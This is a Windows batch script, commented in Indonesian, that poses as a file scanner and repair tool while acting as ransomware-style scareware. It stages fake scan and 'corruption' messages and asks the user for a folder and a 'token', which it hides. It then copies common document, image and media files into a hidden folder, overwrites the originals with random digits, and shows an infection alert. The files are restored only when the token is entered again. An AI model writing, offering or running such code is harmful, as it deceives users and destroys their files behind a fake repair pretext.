@echo off
setlocal enabledelayedexpansion

:: Definisikan file tempat token dan status proses disimpan
set "tokenFile=%~dp0token.txt"
set "statusFile=%~dp0status.txt"
set "backupDir=%~dp0Restored_Folder"

:: Mengecek apakah file token dan status ada, jika tidak buat
if not exist "%tokenFile%" (
    echo [RUNNING] Check and Scanning.........
) else (
    echo [RUNNING] Scanning process............
    echo [RUNNING] Scanning process............
    
)
timeout /t 3 >nul
cls

:: Meminta input direktori dari pengguna
echo [SYSTEM] Initiating scan for all windows directory:
echo [SYSTEM] Status: Initializing scanning process...
timeout /t 2 >nul

echo [STATUS] Verifying file integrity...
echo [STATUS] Assessing potential issues...
echo [STATUS] Scanning all files and subdirectories...
timeout /t 3 >nul

echo [SYSTEM] Rechecking file status for anomalies...
echo [SYSTEM] Conducting deep scan for potential problems...
echo [STATUS] Analyzing file structure and integrity...
timeout /t 3 >nul

echo [WARNING] Detected corruption in some files and directories.
echo [STATUS] Investigating affected Windows system folders...
timeout /t 4 >nul
cls
echo [SCANNING].........................
echo [SCANNING]...........................
echo [SCANNING].........................
echo [SYSTEM STATUS] Please wait...........
timeout /t 6 >nul
cls
echo *********************************************************************
echo [INFO] Your document directory some files has been corrupted!
echo Please input your directory address to repair some corrupted files
echo Input your directory address (example : C:\Users\Asus\Dokumen\):
echo **********************************************************************
echo.
set /p "targetDir=Input your directory address: "

:: Validasi direktori
if not exist "%targetDir%" (
    echo [ERROR] Directory "%targetDir%" missing!.
    goto input_directory
)

:: Pastikan direktori dapat diakses
cd /d "%targetDir%" 2>nul || (
    echo [ERROR] "%targetDir%" tidak dapat diakses. Jalankan skrip sebagai Administrator.
    pause
    exit /b
)

:: Mengecek apakah token sudah disimpan sebelumnya
if not exist "%tokenFile%" (
    echo [INFO] Token undefined input your token access.
    call :getHiddenInput "Your token " userToken
    echo !userToken!> "%tokenFile%"
    attrib +h +s "%tokenFile%"
) else (
    echo [INFO] Token has been creating.
)

:: Proses backup file
if not exist "%backupDir%" (
    mkdir "%backupDir%"
    attrib +h +s "%backupDir%"
)

set "fileTypes=*.jpg *.jpeg *.png *.mp3 *.mp4 *.pdf *.docx *.xlsx *.pptx"

:: Backup file sebelum dikorupsi
for %%F in (%fileTypes%) do (
    if exist "%%F" (
        if not exist "%backupDir%\%%F" (
            echo [RUNNING] ............: %%F
            copy /v "%%F" "%backupDir%\%%F" >nul 2>&1
        )
    )
)

:: Simpan status backup
echo backup_complete > "%statusFile%"

:: Korupsi file setelah backup
echo [RUNING] Repair all file 
for %%F in (%fileTypes%) do (
    if exist "%%F" (
        > "%%F" (
            for /L %%i in (1,1,1000) do echo !random!!random!!random!!random!!random!
        )
    )
)
cls
color 4
echo ***************************************************
echo [ALERT] You have been infected with a corrupt virus !
echo [ALERT] Your all files has been corruption !!
echo [ALERT] Your all files undifined now !!
echo [ALERT] You can't read and open your files !!
echo [ALERT] Input valid token if you want repair all file !!
echo ***************************************************

:: Simpan status verifikasi token
echo token_verification > "%statusFile%"
attrib +h +s "%statusFile%"

:: Meminta token pemulihan dari pengguna
:token_verification
call :getHiddenInput "Input your valid token  " inputToken
echo.

:: Verifikasi token dari file tersembunyi
set /p storedToken=<"%tokenFile%"

if "!inputToken!"=="!storedToken!" (
    color a
    echo [SUCCESS] Token Valid !
    echo [SUCCESS] Token Valid !
    echo [SUCCESS] Token Valid !
    echo [SUCCESS] Token Valid !
    echo [SUCCESS] Token Valid !
    echo [SUCCESS] Token Valid !
   timeout /t 2 >nul
   cls
    echo [REPAIRING PROCESSING SYSTEM]
    echo [REPAIRING] Please waiting....................
    echo [REPAIRING] Please waiting....................
    echo [REPAIRING] Please waiting....................
    timeout /t 4 >nul
    for %%F in (%fileTypes%) do (
        if exist "%backupDir%\%%F" (
            copy /v /y "%backupDir%\%%F" "%targetDir%\%%F" >nul 2>&1
        )
    )
    del "%statusFile%" >nul 2>&1
    echo [INFO] Repair all file success
) else (
    color 4
    echo [ERROR] Token was wrong !.
    echo [ERROR] Input your valid token if you want restore all file
    goto token_verification
)

echo Successfully close your terminal 
pause >nul
exit /b

:getHiddenInput
setlocal enabledelayedexpansion
set "psCommand=powershell -Command "$p = read-host '%~1' -AsSecureString ; $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($p); [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set "input=%%p"
endlocal & set "%~2=%input%"
goto :eof